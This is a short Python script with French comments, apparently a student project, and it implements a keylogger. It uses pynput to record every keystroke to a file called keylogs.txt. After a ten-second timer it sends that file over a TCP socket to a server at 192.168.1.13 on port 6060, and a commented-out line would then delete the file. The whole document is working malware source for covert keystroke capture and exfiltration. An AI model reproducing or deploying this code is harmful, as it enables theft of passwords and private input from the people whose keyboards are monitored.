import socket
import os
import time
import threading
from pynput.keyboard import Key, Listener
import logging
  
fin = False

def on_press(key):
    logging.info(str(key))
 
def tracing(): 
    if not fin:
        logging.basicConfig(filename=("keylogs.txt"),filemode='w' ,
                            format='%(asctime)s: %(levelname)s: %(message)s',level=logging.DEBUG)

        Listener(on_press=on_press).start()

def send_file(filename, server_address, server_port):
    with open(filename, 'rb') as file:
        file_data = file.read()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_address, server_port))
        s.sendall(file_data)

def minuteur(dead):
    global fin

    i = 0
    while i < dead :
        print(i)
        time.sleep(1)
        i+=1
        # a = input("press 'a' pour redemarer le minuteur")
        # if a == 'a':
        #     i=0
        # elif a =='b':
        #     fin = True
        #     break
   
    
threading.Thread(target=tracing,daemon=True).start()
filename = "keylogs.txt" 
server_address = "192.168.1.13"  # Adresse IP du serveur
server_port = 6060  # Port du serveur
minuteur(10)
send_file(filename, server_address, server_port)
#os.remove(filename)
fin = True